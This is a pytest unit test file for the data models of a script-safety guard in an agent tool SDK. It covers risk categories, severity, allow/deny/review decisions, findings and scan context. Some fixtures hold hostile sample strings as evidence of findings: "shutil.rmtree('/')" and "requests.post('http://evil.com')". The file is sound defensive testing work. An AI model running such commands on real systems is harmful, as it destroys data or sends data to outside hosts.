"""Unit tests for safety guard data models."""

import ast

import pytest

from trpc_agent_sdk.tools.safety.models import (
    Decision,
    Finding,
    Language,
    RiskCategory,
    SafetyCheckInput,
    SafetyCheckResult,
    ScanContext,
    Severity,
    ToolMetadata,
)


class TestEnums:
    """Test enum definitions and values."""

    def test_risk_category_values(self):
        assert RiskCategory.FILE_OPERATIONS == "file_operations"
        assert RiskCategory.NETWORK == "network"
        assert RiskCategory.PROCESS == "process"
        assert RiskCategory.DEPENDENCY == "dependency"
        assert RiskCategory.RESOURCE == "resource"
        assert RiskCategory.SECRETS == "secrets"

    def test_risk_category_count(self):
        assert len(RiskCategory) == 6

    def test_severity_values(self):
        assert Severity.HIGH == "high"
        assert Severity.MEDIUM == "medium"
        assert Severity.LOW == "low"

    def test_severity_count(self):
        assert len(Severity) == 3

    def test_decision_values(self):
        assert Decision.ALLOW == "allow"
        assert Decision.DENY == "deny"
        assert Decision.NEEDS_HUMAN_REVIEW == "needs_human_review"

    def test_decision_count(self):
        assert len(Decision) == 3

    def test_language_values(self):
        assert Language.PYTHON == "python"
        assert Language.BASH == "bash"

    def test_language_count(self):
        assert len(Language) == 2


class TestToolMetadata:
    """Test ToolMetadata model."""

    def test_default_construction(self):
        meta = ToolMetadata()
        assert meta.tool_name == ""
        assert meta.skill_name == ""
        assert meta.invocation_id == ""
        assert meta.agent_name == ""
        assert meta.user_id == ""
        assert meta.parameters == {}

    def test_full_construction(self):
        meta = ToolMetadata(
            tool_name="exec_python",
            skill_name="coding",
            invocation_id="inv-123",
            agent_name="coding_agent",
            user_id="user-001",
            parameters={"timeout": 30},
        )
        assert meta.tool_name == "exec_python"
        assert meta.skill_name == "coding"
        assert meta.invocation_id == "inv-123"
        assert meta.agent_name == "coding_agent"
        assert meta.user_id == "user-001"
        assert meta.parameters == {"timeout": 30}

    def test_serialization(self):
        meta = ToolMetadata(tool_name="test_tool")
        data = meta.model_dump()
        assert data["tool_name"] == "test_tool"
        assert isinstance(data["parameters"], dict)


class TestFinding:
    """Test Finding model."""

    def test_minimal_construction(self):
        finding = Finding(
            rule_id="FS-001",
            category=RiskCategory.FILE_OPERATIONS,
            severity=Severity.HIGH,
            decision=Decision.DENY,
        )
        assert finding.rule_id == "FS-001"
        assert finding.category == RiskCategory.FILE_OPERATIONS
        assert finding.severity == Severity.HIGH
        assert finding.decision == Decision.DENY
        assert finding.confidence == 1.0
        assert finding.evidence == ""
        assert finding.line_number == 0
        assert finding.description == ""
        assert finding.recommendation == ""

    def test_full_construction(self):
        finding = Finding(
            rule_id="NET-003",
            category=RiskCategory.NETWORK,
            severity=Severity.MEDIUM,
            decision=Decision.NEEDS_HUMAN_REVIEW,
            confidence=0.8,
            evidence="requests.get('http://evil.com')",
            line_number=42,
            description="External network connection detected",
            recommendation="Verify the domain is trusted",
        )
        assert finding.confidence == 0.8
        assert finding.line_number == 42

    def test_confidence_bounds(self):
        with pytest.raises(Exception):
            Finding(
                rule_id="X",
                category=RiskCategory.NETWORK,
                severity=Severity.LOW,
                decision=Decision.ALLOW,
                confidence=1.5,
            )
        with pytest.raises(Exception):
            Finding(
                rule_id="X",
                category=RiskCategory.NETWORK,
                severity=Severity.LOW,
                decision=Decision.ALLOW,
                confidence=-0.1,
            )

    def test_line_number_non_negative(self):
        with pytest.raises(Exception):
            Finding(
                rule_id="X",
                category=RiskCategory.NETWORK,
                severity=Severity.LOW,
                decision=Decision.ALLOW,
                line_number=-1,
            )


class TestSafetyCheckInput:
    """Test SafetyCheckInput model."""

    def test_minimal_construction(self):
        inp = SafetyCheckInput(
            script_content="print('hello')",
            language=Language.PYTHON,
        )
        assert inp.script_content == "print('hello')"
        assert inp.language == Language.PYTHON
        assert inp.command_args == []
        assert inp.working_directory == ""
        assert inp.environment_variables == {}
        assert isinstance(inp.tool_metadata, ToolMetadata)

    def test_full_construction(self):
        inp = SafetyCheckInput(
            script_content="rm -rf /tmp/cache",
            language=Language.BASH,
            command_args=["bash", "-c"],
            working_directory="/home/user",
            environment_variables={"PATH": "/usr/bin"},
            tool_metadata=ToolMetadata(tool_name="bash_exec"),
        )
        assert inp.language == Language.BASH
        assert inp.command_args == ["bash", "-c"]
        assert inp.working_directory == "/home/user"
        assert inp.environment_variables == {"PATH": "/usr/bin"}
        assert inp.tool_metadata.tool_name == "bash_exec"


class TestSafetyCheckResult:
    """Test SafetyCheckResult model."""

    def test_allow_result(self):
        result = SafetyCheckResult(
            decision=Decision.ALLOW,
            scanned_language=Language.PYTHON,
        )
        assert result.decision == Decision.ALLOW
        assert result.findings == []
        assert result.scan_duration_ms == 0.0
        assert result.max_severity == "none"
        assert result.is_blocked is False

    def test_deny_result_with_findings(self):
        findings = [
            Finding(
                rule_id="FS-001",
                category=RiskCategory.FILE_OPERATIONS,
                severity=Severity.HIGH,
                decision=Decision.DENY,
                evidence="shutil.rmtree('/')",
                line_number=5,
            ),
            Finding(
                rule_id="NET-001",
                category=RiskCategory.NETWORK,
                severity=Severity.HIGH,
                decision=Decision.DENY,
                evidence="requests.post('http://evil.com')",
                line_number=10,
            ),
        ]
        result = SafetyCheckResult(
            decision=Decision.DENY,
            findings=findings,
            scan_duration_ms=3.5,
            scanned_language=Language.PYTHON,
            tool_name="exec",
            invocation_id="inv-abc",
        )
        assert result.is_blocked is True
        assert result.max_severity == "high"
        assert len(result.findings) == 2
        assert result.tool_name == "exec"
        assert result.invocation_id == "inv-abc"

    def test_max_severity_ordering(self):
        # Mixed medium and low findings — should return medium (highest)
        result = SafetyCheckResult(
            decision=Decision.NEEDS_HUMAN_REVIEW,
            findings=[
                Finding(
                    rule_id="X",
                    category=RiskCategory.PROCESS,
                    severity=Severity.MEDIUM,
                    decision=Decision.NEEDS_HUMAN_REVIEW,
                ),
                Finding(
                    rule_id="Y",
                    category=RiskCategory.PROCESS,
                    severity=Severity.LOW,
                    decision=Decision.ALLOW,
                ),
            ],
            scanned_language=Language.BASH,
        )
        assert result.max_severity == "medium"

    def test_max_severity_high_wins(self):
        # High + medium findings — should return high
        result = SafetyCheckResult(
            decision=Decision.DENY,
            findings=[
                Finding(
                    rule_id="X",
                    category=RiskCategory.PROCESS,
                    severity=Severity.HIGH,
                    decision=Decision.DENY,
                ),
                Finding(
                    rule_id="Y",
                    category=RiskCategory.NETWORK,
                    severity=Severity.MEDIUM,
                    decision=Decision.NEEDS_HUMAN_REVIEW,
                ),
            ],
            scanned_language=Language.PYTHON,
        )
        assert result.max_severity == "high"


class TestScanContext:
    """Test ScanContext model."""

    def test_construction_without_ast(self):
        ctx = ScanContext(
            source_code="echo hello",
            language=Language.BASH,
            lines=["echo hello"],
        )
        assert ctx.ast_tree is None
        assert ctx.language == Language.BASH
        assert ctx.lines == ["echo hello"]

    def test_construction_with_ast(self):
        source = "x = 1\nprint(x)"
        tree = ast.parse(source)
        ctx = ScanContext(
            source_code=source,
            language=Language.PYTHON,
            ast_tree=tree,
            lines=source.splitlines(),
        )
        assert ctx.ast_tree is not None
        assert isinstance(ctx.ast_tree, ast.Module)
        assert len(ctx.lines) == 2

    def test_from_input_python(self):
        source = "import os\nos.listdir('.')"
        tree = ast.parse(source)
        check_input = SafetyCheckInput(
            script_content=source,
            language=Language.PYTHON,
            working_directory="/home/user",
            environment_variables={"HOME": "/home/user"},
            tool_metadata=ToolMetadata(tool_name="exec_python"),
        )
        ctx = ScanContext.from_input(check_input, ast_tree=tree)
        assert ctx.source_code == source
        assert ctx.language == Language.PYTHON
        assert ctx.ast_tree is tree
        assert ctx.lines == source.splitlines()
        assert ctx.working_directory == "/home/user"
        assert ctx.environment_variables == {"HOME": "/home/user"}
        assert ctx.tool_metadata.tool_name == "exec_python"

    def test_from_input_bash_no_ast(self):
        source = "ls -la /tmp"
        check_input = SafetyCheckInput(
            script_content=source,
            language=Language.BASH,
        )
        ctx = ScanContext.from_input(check_input)
        assert ctx.ast_tree is None
        assert ctx.language == Language.BASH
        assert ctx.lines == ["ls -la /tmp"]
